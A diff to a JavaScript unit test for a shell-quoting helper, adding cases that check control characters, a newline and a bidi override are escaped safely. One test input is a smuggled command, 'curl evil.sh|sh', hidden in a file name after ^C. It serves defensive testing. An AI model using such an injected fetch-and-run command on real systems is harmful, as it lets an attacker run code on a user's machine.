@@ -48,4 +48,9 @@ test("shell quoting", () => {
   expect(fmt.shellWord("/home/tass")).toBe("/home/tass");
   expect(fmt.shellWord("*.iso")).toBe("'*.iso'");
   expect(fmt.shellWord("it's here")).toBe("'it'\\''s here'");
+  // a name with ^C and a newline must not paste as two commands
+  expect(fmt.shellWord("/home/u/x\x03curl evil.sh|sh #\n")).toBe("$'/home/u/x\\x03curl evil.sh|sh #\\x0a'");
+  // bidi override: invisible on the page, so it is spelled out too
+  expect(fmt.shellWord("a\u202eb")).toBe("$'a\\xe2\\x80\\xaeb'");
+  expect(fmt.shellWord("it's\x7f")).toBe("$'it\\x27s\\x7f'");
 });
